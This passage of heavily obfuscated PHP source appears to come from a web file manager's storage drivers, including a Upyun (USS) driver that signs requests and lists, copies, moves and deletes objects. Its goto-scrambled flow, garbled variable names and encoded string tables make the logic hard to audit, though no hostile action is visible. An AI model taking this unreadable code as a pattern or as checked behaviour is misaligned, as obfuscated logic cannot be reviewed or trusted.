explode($a’Ä‚æÑß‘[177], $this->getHost()); $c§‰Ã¯®âÛ = array($a’Ä‚æÑß‘[1322] => $D‘ªÊÉÅÌ[1], $a’Ä‚æÑß‘[1323] => $a’Ä‚æÑß‘[33], $a’Ä‚æÑß‘[210] => $a’Ä‚æÑß‘[119], $a’Ä‚æÑß‘[1236] => $a÷Íìé‘ˆ[$a’Ä‚æÑß‘[78]]); goto b¡½‰¸ÁŠá; DŸÇÉÀàÀÃ: if (strpos($FÎ’¨Ï­Æƒ, $a’Ä‚æÑß‘[224]) === 0) { if (isset($eœ¬çì©«…[$a’Ä‚æÑß‘[1321]])) { $d¦ğŠŠ³È² = $eœ¬çì©«…[$a’Ä‚æÑß‘[1321]]; } else { if (isset($E§ÖÚë£Ş[$a’Ä‚æÑß‘[1321]])) { $d¦ğŠŠ³È² = $E§ÖÚë£Ş[$a’Ä‚æÑß‘[1321]]; } else { $d¦ğŠŠ³È² = hash($a’Ä‚æÑß‘[1234], $a’Ä‚æÑß‘[33]); } } return array($a’Ä‚æÑß‘[231] => $E§ÖÚë£Ş[$a’Ä‚æÑß‘[231]], $a’Ä‚æÑß‘[1321] => $d¦ğŠŠ³È², $a’Ä‚æÑß‘[221] => $E§ÖÚë£Ş[$a’Ä‚æÑß‘[1324]]); } return $E§ÖÚë£Ş[$a’Ä‚æÑß‘[231]]; goto aâµÙŒñ¨‡; aâµÙŒñ¨‡: } public function listUploadParts($AàÆÍåÕÏ‡, $eÀĞËÊ¼Á¸ = array()) { goto aŒ¢á¥ÁÅæ; aÃ©çÖÇ‰‘: $f‘”Ç“åÉç = $this->client->__getSignatureV4($ağ÷¢‰îô, $B¥ËöÏµ¶Õ, $EªïÀ¨Š¿©, $EˆÒˆ³±§Ã, $aŞëçá‹í‘); return array($A§ìì¦¿ —[231] => $f‘”Ç“åÉç[$A§ìì¦¿ —[231]], $A§ìì¦¿ —[221] => $f‘”Ç“åÉç[$A§ìì¦¿ —[1324]], $A§ìì¦¿ —[233] => $dÙõŒØÊŠâ, $A§ìì¦¿ —[1321] => $f‘”Ç“åÉç[$A§ìì¦¿ —[1321]]); goto f¢”›…ãº; FÀ¥êÙÌ‡¦: $aŞëçá‹í‘ .= $A§ìì¦¿ —[1328]; $ağ÷¢‰îô = array(); $dšˆ¸­„Ìš = explode($A§ìì¦¿ —[177], $this->getHost()); goto BŒ´¢È•ù; BŒ´¢È•ù: $B¥ËöÏµ¶Õ = array($A§ìì¦¿ —[1322] => $dšˆ¸­„Ìš[1], $A§ìì¦¿ —[210] => $A§ìì¦¿ —[119], $A§ìì¦¿ —[1236] => strlen($aŞëçá‹í‘)); $EªïÀ¨Š¿© = $A§ìì¦¿ —[223]; $EˆÒˆ³±§Ã = $A§ìì¦¿ —[8] . $this->pathEncode($AàÆÍåÕÏ‡) . $eÀĞËÊ¼Á¸[$A§ìì¦¿ —[168]]; goto aÃ©çÖÇ‰‘; DÜÅÒ¦…åù: if (!$dÙõŒØÊŠâ) { return !1; } $aŞëçá‹í‘ = $A§ìì¦¿ —[1325]; foreach ($dÙõŒØÊŠâ as $E¤³÷ÆÇ»‰) { $aŞëçá‹í‘ .= $A§ìì¦¿ —[1326] . "\x3c\120\141\x72\164\x4e\165\155\142\x65\162\76{$E¤³÷ÆÇ»‰[$A§ìì¦¿ —[1281]]}\74\57\x50\141\x72\164\116\x75\x6d\x62\x65\x72\x3e\12" . "\74\x45\x54\x61\147\x3e{$E¤³÷ÆÇ»‰[$A§ìì¦¿ —[1282]]}\74\57\105\x54\x61\x67\76\12" . $A§ìì¦¿ —[1327]; } goto FÀ¥êÙÌ‡¦; aŒ¢á¥ÁÅæ: $A§ìì¦¿ — =& $_SERVER[´¬]; $Eíç¿¦âÈ = str_replace($A§ìì¦¿ —[232], $A§ìì¦¿ —[33], $eÀĞËÊ¼Á¸[$A§ìì¦¿ —[168]]); $dÙõŒØÊŠâ = $this->client->listParts($this->bucket, $AàÆÍåÕÏ‡, $Eíç¿¦âÈ); goto DÜÅÒ¦…åù; f¢”›…ãº: } public function link($E‰¯¦ô„¬, $C©œˆ×‰‰Š = array()) { return parent::link($E‰¯¦ô„¬, $C©œˆ×‰‰Š); } public function fileOut($cÅÁ÷ —ôô, $d¡‚ó½‡Í· = false, $dŞ›Ûö£× = false, $C’¾¾ìóæ´ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[´¬][1329])) { return parent::fileOutServer($cÅÁ÷ —ôô, $d¡‚ó½‡Í·, $dŞ›Ûö£×, $C’¾¾ìóæ´); } parent::fileOut($cÅÁ÷ —ôô, $d¡‚ó½‡Í·, $dŞ›Ûö£×, $C’¾¾ìóæ´); } public function fileOutImage($cÉ˜øàÑÃğ, $eŠÚŸÀ ²÷ = 250) { if (strstr($this->endpoint, $_SERVER[´¬][1329])) { return parent::fileOutImageServer($cÉ˜øàÑÃğ, $eŠÚŸÀ ²÷); } parent::fileOutImage($cÉ˜øàÑÃğ, $eŠÚŸÀ ²÷); } public function fileOutLink($fëæ¢äµÔ) { $EÎÄ‚¶ñƒ =& $_SERVER[´¬]; if (substr($fëæ¢äµÔ, 0, 7) == $EÎÄ‚¶ñƒ[1204]) { $fëæ¢äµÔ = $EÎÄ‚¶ñƒ[1205] . substr($fëæ¢äµÔ, 7); } header($EÎÄ‚¶ñƒ[159] . $fëæ¢äµÔ); die; } public function getHost() { $Eá’¾„ÄÎğ =& $_SERVER[´¬]; $Eøßø»§ = str_rtrim(parent::getHost(), $Eá’¾„ÄÎğ[8] . $this->bucket); $Eøßø»§ = explode($Eá’¾„ÄÎğ[177], $Eøßø»§); return $Eøßø»§[0] . $Eá’¾„ÄÎğ[177] . $this->bucket . $Eá’¾„ÄÎğ[95] . $Eøßø»§[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($C—“›ïßŸ, $dÒÓ¯êÊŠ° = 0) { parent::__construct(); $this->source = $C—“›ïßŸ; $this->sourceSize = $dÒÓ¯êÊŠ°; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dÍ‹Ìáñ„¾ = false) { return $this->sourceSize; } public function getContent($E¢è’áˆÑ = false) { return $this->fileSubstr($E¢è’áˆÑ, 0, $this->sourceSize); } public function fileSubstr($E˜‚‹Îµ‡µ = false, $B›¦¯ïˆÊ = 0, $eÏ“ƒ®…—¨ = 0) { if (!$eÏ“ƒ®…—¨) { $eÏ“ƒ®…—¨ = $this->sourceSize; } $Bº¬®Õ‰–Ğ = $this->sourceSize - $B›¦¯ïˆÊ; if ($eÏ“ƒ®…—¨ >= $Bº¬®Õ‰–Ğ) { $eÏ“ƒ®…—¨ = $Bº¬®Õ‰–Ğ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $B›¦¯ïˆÊ, $eÏ“ƒ®…—¨); } if ($this->sourceType == self::TYPE_FILE) { if ($eÏ“ƒ®…—¨ <= 0) { return $_SERVER[´¬][33]; } $b¯‡Ø‹²ŒÄ = ftell($this->source); fseek_64($this->source, $b¯‡Ø‹²ŒÄ + $B›¦¯ïˆÊ); $B¸œÌ‡íÖè = @fread($this->source, $eÏ“ƒ®…—¨); fseek_64($this->source, $b¯‡Ø‹²ŒÄ); return $B¸œÌ‡íÖè; } } public function hashMd5($a‰™«½ñŠ— = false) { return md5($this->getContent()); } public static function hash($aß»¦Ó£ñ©, $C ‡İ¤Ó‡ = 0) { $fè­ÖÁœŠ¢ = new PathDriverStream($aß»¦Ó£ñ©, $C ‡İ¤Ó‡); return $fè­ÖÁœŠ¢->hashSimple($aß»¦Ó£ñ©); } public static function md5($e¼È–„—í•, $aŠŠ©Ñ»‹ï = 0) { $B¾¥£‚É›Š = new PathDriverStream($e¼È–„—í•, $aŠŠ©Ñ»‹ï); return $B¾¥£‚É›Š->hashMd5($e¼È–„—í•); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\x2f\x2f\166\60\56\x61\160\x69\x2e\165\160\171\x75\x6e\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($BÊÅ»áĞºí) { parent::__construct(); $this->_init($BÊÅ»áĞºí); } public function _init($e¨ïÕ¨Î†š) { $F¨±Â×ß‚á =& $_SERVER[´¬]; foreach ($e¨ïÕ¨Î†š as $C©Öğ’åá => $cÃ‡—Ÿ‘Å) { if (isset($this->{$C©Öğ’åá})) { $this->{$C©Öğ’åá} = $cÃ‡—Ÿ‘Å; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($F¨±Â×ß‚á[1330] . LNG($F¨±Â×ß‚á[1262])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Cš™ƒˆé•ù, $d±Çïâ‹ = "\x47\105\x54") { $EŞĞšóÌ´ =& $_SERVER[´¬]; $CŒÔæÔæ› = gmdate($EŞĞšóÌ´[1296]); $D‰¶èƒŠã¡ = base64_encode(hash_hmac($EŞĞšóÌ´[1331], "{$d±Çïâ‹}\46{$Cš™ƒˆé•ù}\x26{$CŒÔæÔæ›}", md5("{$this->userpass}"), !0)); $e²Õ¹Ü±×— = array("\101\x75\x74\x68\x6f\x72\151\172\141\x74\151\157\x6e\72\125\x50\131\125\x4e\x20{$this->username}\x3a{$D‰¶èƒŠã¡}", "\x44\141\x74\145\x3a{$CŒÔæÔæ›}"); return $e²Õ¹Ü±×—; } public function ussRequest($b‡ˆ¤‡…‰ø, $dÂÇ£Âƒ¢ = "\107\105\124", $e„ÉÊÔëÂ = false, $C¦¯¤Ë£ï‘ = false, $dÆØµ¸— = false) { goto C¨®·ñä½™; fˆÀ²›¤Ì—: $dÒçŒ¿õ·‹ = $this->ussHeaders($BäÇ—¬³Æ, $dÂÇ£Âƒ¢); if ($C¦¯¤Ë£ï‘) { $dÒçŒ¿õ·‹ = array_merge($dÒçŒ¿õ·‹, $C¦¯¤Ë£ï‘); } $eëŸ«ãˆá… = url_request($this->endpoint . $BäÇ—¬³Æ, $dÂÇ£Âƒ¢, $e„ÉÊÔëÂ, $dÒçŒ¿õ·‹, $dÆØµ¸—); goto bÅ§‰„Üƒì; bÅ§‰„Üƒì: if (!$eëŸ«ãˆá…) { return array($aë¦ëÀ[1087] => !1, $aë¦ëÀ[1089] => $aë¦ëÀ[1332]); } if (strtolower($dÂÇ£Âƒ¢) == $aë¦ëÀ[190] || in_array($eëŸ«ãˆá…[$aë¦ëÀ[1087]], array($aë¦ëÀ[1189], $aë¦ëÀ[1333]))) { $e„ÉÊÔëÂ = $eëŸ«ãˆá…[$aë¦ëÀ[1334]]; } else { $e„ÉÊÔëÂ = json_decode($eëŸ«ãˆá…[$aë¦ëÀ[1089]], !0); if (!$e„ÉÊÔëÂ) { $e„ÉÊÔëÂ = $eëŸ«ãˆá…[$aë¦ëÀ[1089]]; } else { if (!$eëŸ«ãˆá…[$aë¦ëÀ[713]] && isset($e„ÉÊÔëÂ[$aë¦ëÀ[1335]])) { $e„ÉÊÔëÂ = $e„ÉÊÔëÂ[$aë¦ëÀ[1335]]; } } } return array($aë¦ëÀ[1087] => $eëŸ«ãˆá…[$aë¦ëÀ[713]], $aë¦ëÀ[1089] => $e„ÉÊÔëÂ); goto A—¿ŠÍ‘ñÒ; C¨®·ñä½™: $aë¦ëÀ =& $_SERVER[´¬]; $b‡ˆ¤‡…‰ø = trim($b‡ˆ¤‡…‰ø, $aë¦ëÀ[8]); $BäÇ—¬³Æ = "\x2f{$this->bucket}\x2f{$b‡ˆ¤‡…‰ø}"; goto fˆÀ²›¤Ì—; A—¿ŠÍ‘ñÒ: } public function mkfile($dÏÆùƒÌŒ, $b¢«ä·“áŒ = '', $e®©Ç£‹ = REPEAT_RENAME) { if ($this->setContent($dÏÆùƒÌŒ, $b¢«ä·“áŒ)) { return $this->getPathOuter($dÏÆùƒÌŒ); } return !1; } public function mkdir($Aãõ£Ñ¸¨, $e‹æïÎß»ô = REPEAT_SKIP) { $BÈ÷ˆ° =& $_SERVER[´¬]; $B¤ôŠñÚÁ÷ = trim($Aãõ£Ñ¸¨, $BÈ÷ˆ°[8]); if ($this->_isFolder($B¤ôŠñÚÁ÷)) { return $this->getPathOuter($B¤ôŠñÚÁ÷); } $d¯æÑÔÃò¯ = array($BÈ÷ˆ°[1336]); $dº‹××ö„… = $this->ussRequest($B¤ôŠñÚÁ÷, $BÈ÷ˆ°[223], !1, $d¯æÑÔÃò¯); return $dº‹××ö„…[$BÈ÷ˆ°[1087]] ? $this->getPathOuter($B¤ôŠñÚÁ÷) : !1; } public function copyFile($e¶õìâ¾°, $f›â•™İƒ) { $c‘ö›Õ™˜Ş =& $_SERVER[´¬]; $AªµôàŒ÷ = array($c‘ö›Õ™˜Ş[1337] . "\57{$this->bucket}\57{$e¶õìâ¾°}", $c‘ö›Õ™˜Ş[1338]); $A†Ş™À©À’ = $this->ussRequest($f›â•™İƒ, $c‘ö›Õ™˜Ş[225], !1, $AªµôàŒ÷); return $A†Ş™À©À’[$c‘ö›Õ™˜Ş[1087]] ? !0 : $this->getPathOuter($f›â•™İƒ); } public function moveFile($CÈÑÎ˜¸…¾, $a¼„«¢ÒğÜ) { $fØ”¢ìíËª =& $_SERVER[´¬]; $AĞ—‘Õ¹›ã = array($fØ”¢ìíËª[1339] . "\x2f{$this->bucket}\x2f{$CÈÑÎ˜¸…¾}", $fØ”¢ìíËª[1338]); $E¨…ºİÂ = $this->ussRequest($a¼„«¢ÒğÜ, $fØ”¢ìíËª[225], !1, $AĞ—‘Õ¹›ã); return $E¨…ºİÂ[$fØ”¢ìíËª[1087]] ? !0 : $this->getPathOuter($a¼„«¢ÒğÜ); } public function delFile($FÅç²éİ…¶) { $aå¿Ä‹Ñ” =& $_SERVER[´¬]; $E‰¹‚Œ½ñç = $this->ussRequest($FÅç²éİ…¶, $aå¿Ä‹Ñ”[1340]); return $E‰¹‚Œ½ñç[$aå¿Ä‹Ñ”[1087]] ? !0 : !1; } public function delFolder($EË¢å¬¥òœ) { goto FÛñÊ¡Ëà; FÛñÊ¡Ëà: $AàÄ¨…¤ñá =& $_SERVER[´¬]; if (!$this->exist($EË¢å¬¥òœ)) { return !0; } $this->listItemCache = !1; goto FÀŠ×½¾Ù–; DÊôÕµ¯–: return $Bíß‹ßÆ«[$AàÄ¨…¤ñá[1087]]; goto D˜ñŸ×äª·; FÀŠ×½¾Ù–: $bæ¤ä¸ãõ = $Eë¸Ó¿·ùá = array(); $this->fileList($EË¢å¬¥òœ, $bæ¤ä¸ãõ, $Eë¸Ó¿·ùá, !0); $this->listItemCache = !0; goto fÊÓî®Şò·; fÊÓî®Şò·: foreach ($Eë¸Ó¿·ùá as $cŠ‚ „¬½) { $Bíß‹ßÆ« = $this->ussRequest($cŠ‚ „¬½[$AàÄ¨…¤ñá[28]], $AàÄ¨…¤ñá[1340]); if (!$Bíß‹ßÆ«[$AàÄ¨…¤ñá[1087]]) { return !1; } } foreach ($bæ¤ä¸ãõ as $d†ê÷‡ĞŞö) { $Bíß‹ßÆ« = $this->ussRequest($d†ê÷‡ĞŞö, $AàÄ¨…¤ñá[1340]); if (!$Bíß‹ßÆ«[$AàÄ¨…¤ñá[1087]]) { return !1; } } $Bíß‹ßÆ« = $this->ussRequest($EË¢å¬¥òœ, $AàÄ¨…¤ñá[1340]); goto DÊôÕµ¯–; D˜ñŸ×äª·: } public function rename($f¸‡µô“Š¶, $E«ÅÊáøŠ) { if ($this->isFile($f¸‡µô“Š¶)) { $E«ÅÊáøŠ = get_path_father($f¸‡µô“Š¶) . $E«ÅÊáøŠ; return $this->moveFile($f¸‡µô“Š¶, $E«ÅÊáøŠ); } return $this->renameObject($f¸‡µô“Š¶, $E«ÅÊáøŠ); } public function fileInfo($bÎ†ö“¸‚ô, $d©„«Àèğƒ = false, $aùåŸĞÎŠœ = array()) { goto dìÇõØŞ—“; a”‚İÂ‰ß: $dŠäÙÓ‰îÓ[$E¢ÁìÂ”ÛŒ[193]] = $dŠäÙÓ‰îÓ[$E¢ÁìÂ”ÛŒ[84]] = 0; $dŠäÙÓ‰îÓ[$E¢ÁìÂ”ÛŒ[194]] = $dŠäÙÓ‰îÓ[$E¢ÁìÂ”ÛŒ[195]] = !0; if (empty($aùåŸĞÎŠœ)) { $aùåŸĞÎŠœ = $this->objectMeta($bÎ†ö“¸‚ô); if (!$aùåŸĞÎŠœ) { return $dŠäÙÓ‰îÓ; } } goto Fğ¼âÅ¢Œ¿; E§ã‚•Ÿ¢ô: return $dŠäÙÓ‰îÓ; goto cÉÜÛùÊ”‰; dìÇõØŞ—“: $E¢ÁìÂ”ÛŒ =& $_SERVER[´¬]; $dŠäÙÓ‰îÓ = array($E¢ÁìÂ”ÛŒ[28] => $this->pathThis($bÎ†ö“¸‚ô), $E¢ÁìÂ”ÛŒ[76] => $this->getPathOuter($E¢ÁìÂ”ÛŒ[8] . $bÎ†ö“¸‚ô), $E¢ÁìÂ”ÛŒ[29] => $E¢ÁìÂ”ÛŒ[192], $E¢ÁìÂ”ÛŒ[78] => isset($aùåŸĞÎŠœ[$E¢ÁìÂ”ÛŒ[78]]) ? $aùåŸĞÎŠœ[$E¢ÁìÂ”ÛŒ[78]] : 0, $E¢ÁìÂ”ÛŒ[168] => $this->ext($bÎ†ö“¸‚ô)); if ($d©„«Àèğƒ) { return $dŠäÙÓ‰îÓ; } goto a”‚İÂ‰ß; Fğ¼âÅ¢Œ¿: $dŠäÙÓ‰îÓ[$E¢ÁìÂ”ÛŒ[193]] = intval($aùåŸĞÎŠœ[$E¢ÁìÂ”ÛŒ[1341]]); $dŠäÙÓ‰îÓ[$E¢ÁìÂ”ÛŒ[84]] = intval($aùåŸĞÎŠœ[$E¢ÁìÂ”ÛŒ[1342]]); $dŠäÙÓ‰îÓ[$E¢ÁìÂ”ÛŒ[78]] = $aùåŸĞÎŠœ[$E¢ÁìÂ”ÛŒ[78]]; goto E§ã‚•Ÿ¢ô; cÉÜÛùÊ”‰: } public function folderInfo($D¿‘¤ƒÚ, $Dùçã¡ÔÉ¿ = false) { goto fÍŒÅš™Âõ; BÑ‚Œø‚›ª: $eš‘ùïî£·[$fÀŒ£Ÿ½à[193]] = intval($E¼Ö££ùç[$fÀŒ£Ÿ½à[1341]]); $eš‘ùïî£·[$fÀŒ£Ÿ½à[84]] = intval($E¼Ö££ùç[$fÀŒ£Ÿ½à[1342]]); return $eš‘ùïî£·; goto AÖ´¾Í–Â±; a™ï°‡ºÌÍ: $eš‘ùïî£·[$fÀŒ£Ÿ½à[193]] = $eš‘ùïî£·[$fÀŒ£Ÿ½à[84]] = 0; $eš‘ùïî£·[$fÀŒ£Ÿ½à[194]] = $eš‘ùïî£·[$fÀŒ£Ÿ½à[195]] = !0; if (empty($E¼Ö££ùç)) { $E¼Ö££ùç = $this->objectMeta($D¿‘¤ƒÚ); if (!$E¼Ö££ùç) { return $eš‘ùïî£·; } } goto BÑ‚Œø‚›ª; fÍŒÅš™Âõ: $fÀŒ£Ÿ½à =& $_SERVER[´¬]; $eš‘ùïî£· = array($fÀŒ£Ÿ½à[28] => $this->pathThis($D¿‘¤ƒÚ), $fÀŒ£Ÿ½à[76] => $this->getPathOuter($fÀŒ£Ÿ½à[8] . $D¿‘¤ƒÚ), $fÀŒ£Ÿ½à[29] => $fÀŒ£Ÿ½à[77]); if ($Dùçã¡ÔÉ¿) { return $eš‘ùïî£·; } goto a™ï°‡ºÌÍ; AÖ´¾Í–Â±: } private function listObjs($a«Ö‹Ø˜ïó, $F àÓÚ›ö® = 0, $aå†µ¹õÓ = 1000) { $eŞ¦¯÷º‹‡ =& $_SERVER[´¬]; $DÑ¦ÛÁù… = array($eŞ¦¯÷º‹‡[1343], $eŞ¦¯÷º‹‡[1344] . $aå†µ¹õÓ); if ($F àÓÚ›ö®) { $DÑ¦ÛÁù…[] = $eŞ¦¯÷º‹‡[1345] . $F àÓÚ›ö®; } $BÊÀ ÖÁ¾© = $this->ussRequest($a«Ö‹Ø˜ïó, $eŞ¦¯÷º‹‡[227], !1, $DÑ¦ÛÁù…); return !$BÊÀ ÖÁ¾©[$eŞ¦¯÷º‹‡[1087]] ? !1 : $BÊÀ ÖÁ¾©[$eŞ¦¯÷º‹‡[1089]]; } private function fileList($EÉ¬äïé×, &$bÍ„ˆËïãƒ, &$AÜÕİ‹È“, $DÕ£ì²ª ½ = false) { goto c³²Ë®°è×; A–£®Åâ: $bîÑğî§¸ = rtrim($EÉ¬äïé×, $AùÍÌ ·Ş[8]) . $AùÍÌ ·Ş[8]; $FƒÒæ±¨„’ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $dòÇ¦…ÖÄ = $this->listObjs($EÉ¬äïé×, $Bê„‘£¼ƒ¢, $fÄº—ÔÄ‚); if (!$dòÇ¦…ÖÄ) { return !1; } $Bê„‘£¼ƒ¢ = isset($dòÇ¦…ÖÄ[$AùÍÌ ·Ş[1346]]) ? $dòÇ¦…ÖÄ[$AùÍÌ ·Ş[1346]] : $AùÍÌ ·Ş[33]; $fÛíÆ£ÔôÄ = isset($dòÇ¦…ÖÄ[$AùÍÌ ·Ş[1347]]) ? $dòÇ¦…ÖÄ[$AùÍÌ ·Ş[1347]] : array(); foreach ($fÛíÆ£ÔôÄ as $E„˜ ÃÔÁÍ) { $B·ŠŞ¿† = $E„˜ ÃÔÁÍ[$AùÍÌ ·Ş[29]] == $AùÍÌ ·Ş[77] ? !0 : !1; $b¥Ñ…‚—¿Ú = ltrim($bîÑğî§¸ . $E„˜ ÃÔÁÍ[$AùÍÌ ·Ş[28]], $AùÍÌ ·Ş[8]) . ($B·ŠŞ¿† ? $AùÍÌ ·Ş[8] : $AùÍÌ ·Ş[33]); $b­ÅŸê×ä = array($AùÍÌ ·Ş[28] => $b¥Ñ…‚—¿Ú, $AùÍÌ ·Ş[29] => $B·ŠŞ¿† ? $AùÍÌ ·Ş[77] : $AùÍÌ ·Ş[192], $AùÍÌ ·Ş[78] => $E„˜ ÃÔÁÍ[$AùÍÌ ·Ş[334]], $AùÍÌ ·Ş[1342] => $E„˜ ÃÔÁÍ[$AùÍÌ ·Ş[1348]]); if ($FƒÒæ±¨„’) { $this->cacheMethod($AùÍÌ ·Ş[198], $b¥Ñ…‚—¿Ú, $B·ŠŞ¿†); $this->cacheMethod($AùÍÌ ·Ş[199], $b¥Ñ…‚—¿Ú, $b­ÅŸê×ä); } if ($B·ŠŞ¿†) { $bÍ„ˆËïãƒ[] = $b¥Ñ…‚—¿Ú; if ($DÕ£ì²ª ½) { $this->fileList($b¥Ñ…‚—¿Ú, $bÍ„ˆËïãƒ, $AÜÕİ‹È“, $DÕ£ì²ª ½); } continue; } $AÜÕİ‹È“[] = $b­ÅŸê×ä; } if (count($fÛíÆ£ÔôÄ) < $fÄº—ÔÄ‚) { break; } } goto f·Õ±È…; f·Õ±È…: if ($FƒÒæ±¨„’) { $this->cacheMethod($AùÍÌ ·Ş[198], $EÉ¬äïé×, !0); } goto b¢âÑº¾Ğ“; c³²Ë®°è×: $AùÍÌ ·Ş =& $_SERVER[´¬]; $Bê„‘£¼ƒ¢ = $AùÍÌ ·Ş[33]; $fÄº—ÔÄ‚ = 1000; goto A–£®Åâ; b¢âÑº¾Ğ“: } public function listPath($F…®”Êšä, $d÷¢À²¦ÃÚ = false) { $EÛŒ¢ò™Ã =& $_SERVER[´¬]; $Fä‡¾Ô¾™æ = $Cø‘­âæÏ = array(); $this->fileList($F…®”Êšä, $Fä‡¾Ô¾™æ, $Cø‘­âæÏ); foreach ($Fä‡¾Ô¾™æ as $Bå›¤ÌÏàµ => $E“£‚Â©È) { $Fä‡¾Ô¾™æ[$Bå›¤ÌÏàµ] = $this->folderInfo($E“£‚Â©È, $d÷¢À²¦ÃÚ); } foreach ($Cø‘­âæÏ as $Bå›¤ÌÏàµ => $E“£‚Â©È) { $Cø‘­âæÏ[$Bå›¤ÌÏàµ] = $this->fileInfo($E“£‚Â©È[$EÛŒ¢ò™Ã[28]], $d÷¢À²¦ÃÚ, $E“£‚Â©È); } return array($EÛŒ¢ò™Ã[75] => $Fä‡¾Ô¾™æ, $EÛŒ¢ò™Ã[74] => $Cø‘­âæÏ); } public function has($c¼ÇÒåÃƒ–, $EÙÛ®¨ğğ = false, $AâÚ‹¯ö¿Õ = true) { goto EÛö¶¢ùã; EÛö¶¢ùã: $AğËŠÁ¿©Ğ =& $_SERVER[´¬]; $fª–­‹Î¡Š = $AğËŠÁ¿©Ğ[33]; $Aõó¢©ÇÓ = 500; goto Cù‹àÍ’‰Ä; AŒ¥Ä‹Çõ: while (!0) { check_abort(); $E™ß†§óÀ‡ = $this->listObjs($c¼ÇÒåÃƒ–, $fª–­‹Î¡Š, $Aõó¢©ÇÓ); if (!$E™ß†§óÀ‡) { return !1; } $fª–­‹Î¡Š = isset($E™ß†§óÀ‡[$AğËŠÁ¿©Ğ[1346]]) ? $E™ß†§óÀ‡[$AğËŠÁ¿©Ğ[1346]] : $AğËŠÁ¿©Ğ[33]; $f©²ï¦ Ç = isset($E™ß†§óÀ‡[$AğËŠÁ¿©Ğ[1347]]) ? $E™ß†§óÀ‡[$AğËŠÁ¿©Ğ[1347]] : array(); if (empty($f©²ï¦ Ç)) { break; } $A¡ÉØğâƒñ = array_filter($f©²ï¦ Ç, function ($f½‹¾ïˆ¼) { $E£Ì…·–ÊÃ =& $_SERVER[´¬]; return $f½‹¾ïˆ¼[$E£Ì…·–ÊÃ[29]] == $E£Ì…·–ÊÃ[77]; }); $Fä•áÜ÷Ì = count($f©²ï¦ Ç); $A¡ÉØğâƒñ = count($A¡ÉØğâƒñ); $BÕÌ­è‰«¿ = $Fä•áÜ÷Ì - $A¡ÉØğâƒñ; if ($EÙÛ®¨ğğ) { $bÜàğÃœ¬í += $A¡ÉØğâƒñ; $cÏ•‡×„ëá += $BÕÌ­è‰«¿; if ($Fä•áÜ÷Ì < $Aõó¢©ÇÓ) { break; } continue; } if ($AâÚ‹¯ö¿Õ) { if ($BÕÌ­è‰«¿) { return !0; } } else { if ($A¡ÉØğâƒñ) { return !0; } } if ($Fä•áÜ÷Ì < $Aõó¢©ÇÓ) { break; } } if ($EÙÛ®¨ğğ) { return array($AğËŠÁ¿©Ğ[202] => $cÏ•‡×„ëá, $AğËŠÁ¿©Ğ[203] => $bÜàğÃœ¬í); } return !1; goto C®µÆŠææô; Cù‹àÍ’‰Ä: $cÏ•‡×„ëá = 0; $bÜàğÃœ¬í = 0; $E§¶øÚï¬ = rtrim($c¼ÇÒåÃƒ–, $AğËŠÁ¿©Ğ[8]) . $AğËŠÁ¿©Ğ[8]; goto AŒ¥Ä‹Çõ; C®µÆŠææô: } public function listAll($eÍÌ¼Š—é¡) { goto DÉ¾»ä—¼; e‰À°ï“Ç: $aÜäÒ£ ÄŠ = array(); foreach ($fğèçèõŞ™ as $f½†¿¥”‹Ø) { $aÜäÒ£ ÄŠ[$f½†¿¥”‹Ø[$E„ËĞ»§äÃ[28]]] = $f½†¿¥”‹Ø[$E„ËĞ»§äÃ[78]]; } foreach ($E¬ÈİËÒ­® as $f½†¿¥”‹Ø) { if (is_string($f½†¿¥”‹Ø)) { $aÜäÒ£ ÄŠ[$f½†¿¥”‹Ø] = 0; } } goto AÌßÁ§ò£Û; AÌßÁ§ò£Û: return $this->listAllFiles($eÍÌ¼Š—é¡, array_keys($aÜäÒ£ ÄŠ), $aÜäÒ£ ÄŠ); goto CµŞ¬‡î„•; DÉ¾»ä—¼: $E„ËĞ»§äÃ =& $_SERVER[´¬]; $E¬ÈİËÒ­® = $fğèçèõŞ™ = array(); $this->fileList($eÍÌ¼Š—é¡, $E¬ÈİËÒ­®, $fğèçèõŞ™, !0); goto e‰À°ï“Ç; CµŞ¬‡î„•: } public function canRead($B…Æ›¶³Ê) { return $this->exist($B…Æ›¶³Ê) ? !0 : !1; } public function canWrite($d»Œ†ÈÅìô) { return $this->exist($d»Œ†ÈÅìô) ? !0 : !1; } public function getContent($eêÉØù¨ÑÛ) { return $this->fileSubstr($eêÉØù¨ÑÛ, 0, -1); } public function setContent($A†êêá˜ªĞ, $cßÉªôÀ‡„ = '') { $cø³‡ÛÊ =& $_SERVER[´¬]; if (!$cßÉªôÀ‡„) { $DÇ»ïöÛŠ = $this->ussRequest($A†êêá˜ªĞ, $cø³‡ÛÊ[223]); return $DÇ»ïöÛŠ[$cø³‡ÛÊ[1087]]; } $A÷ªà­çà = $this->tempFile($this->pathThis($A†êêá˜ªĞ)); file_put_contents($A÷ªà­çà, $cßÉªôÀ‡„); if ($this->upload($A†êêá˜ªĞ, $A÷ªà­çà)) { $this->tempFileRemve($A÷ªà­çà); return !0; } return !1; } public function fileSubstr($bŠÌÖ…ìğÜ, $A‘ö–©ùİ, $fôÕÒ¿š²­) { $C¶›İ‚šâ =& $_SERVER[´¬]; if (!($a¦ÄçÓÔ±Â = $this->link($bŠÌÖ…ìğÜ))) { return !1; } $DÓ±™Ã™Š· = !1; if ($fôÕÒ¿š²­ > 0) { $FÀùèÁ¦‘ = $A‘ö–©ùİ + $fôÕÒ¿š²­ - 1; $DÓ±™Ã™Š· = array($C¶›İ‚šâ[1309] . $A‘ö–©ùİ . $C¶›İ‚šâ[438] . $FÀùèÁ¦‘); } $AÁ‰‡…®ØÛ = url_request($a¦ÄçÓÔ±Â, $C¶›İ‚šâ[227], !1, $DÓ±™Ã™Š·); return $AÁ‰‡…®ØÛ[$C¶›İ‚šâ[713]] ? $AÁ‰‡…®ØÛ[$C¶›İ‚šâ[1089]] : !1; } public function 